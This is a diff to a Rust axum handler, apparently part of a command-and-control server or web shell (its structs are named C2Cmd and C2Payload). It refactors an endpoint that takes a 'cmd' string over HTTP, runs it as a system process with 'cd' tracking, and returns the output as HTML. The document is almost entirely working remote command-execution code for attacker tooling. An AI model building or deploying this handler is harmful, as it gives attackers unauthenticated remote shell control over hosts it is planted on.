@@ -1,58 +1,38 @@
-use super::ShellPath;
+use crate::ShellState;
 use axum::{response::Html, Extension, Json};
 use serde::Deserialize;
-use std::path::{Path, PathBuf};
+use std::sync::{Arc, Mutex};
 
 #[derive(Deserialize)]
-pub struct C2Cmd {
+pub struct C2Payload {
     cmd: String,
 }
 
 pub async fn exec_cmd<'a>(
-    Extension(mut ext): Extension<ShellPath>,
-    Json(body): Json<C2Cmd>,
+    Extension(ext): Extension<Arc<Mutex<ShellState>>>,
+    Json(body): Json<C2Payload>,
 ) -> Html<String> {
     let mut cmdvec = body.cmd.split_whitespace();
     let cmd_bin_name = cmdvec.next().unwrap();
 
     let output = if cmd_bin_name == "cd" {
-        manage_path(&mut ext, cmdvec.collect::<Vec<&str>>());
+        ShellState::manage_path(&mut ext.lock().unwrap(), cmdvec.collect::<Vec<&str>>());
         "".to_string()
     } else {
-        let op = std::process::Command::new(cmd_bin_name)
+        let builder = std::process::Command::new(cmd_bin_name)
             .args(cmdvec.collect::<Vec<&str>>())
-            .current_dir(&ext.pwd)
-            .output()
-            .unwrap();
+            .current_dir(&ext.lock().unwrap().pwd)
+            .output();
 
-        format!(
-            "{}\n{}",
-            String::from_utf8(op.stdout).unwrap(),
-            String::from_utf8(op.stderr).unwrap()
-        )
+        match builder {
+            Ok(op) => format!(
+                "{}\n{}",
+                String::from_utf8(op.stdout).unwrap(),
+                String::from_utf8(op.stderr).unwrap()
+            ),
+            Err(_) => String::from("command not found"),
+        }
     };
 
     Html(output)
-}
-
-fn manage_path(ext: &mut ShellPath, cmd_rest: Vec<&str>) {
-    if cmd_rest.len() == 0 || cmd_rest[0] == "~" {
-        let p = std::mem::replace(&mut ext.pwd, ext.home_dir.clone());
-        let _ = std::mem::replace(&mut ext.old_pwd, p);
-    } else if cmd_rest[0] == ".." {
-        ext.old_pwd = ext.pwd.clone();
-        ext.pwd.pop();
-    } else if cmd_rest[0] == "-" {
-        std::mem::swap(&mut ext.old_pwd, &mut ext.pwd);
-    } else {
-        let new_path = Box::new(Path::new(cmd_rest[0]));
-        if new_path.is_relative() {
-            ext.old_pwd = ext.pwd.clone();
-            ext.pwd.push(*new_path);
-        } else if new_path.is_absolute() {
-            let p1 = PathBuf::from(*new_path);
-            let p2 = std::mem::replace(&mut ext.pwd, p1);
-            let _ = std::mem::replace(&mut ext.old_pwd, p2);
-        }
-    }
 }
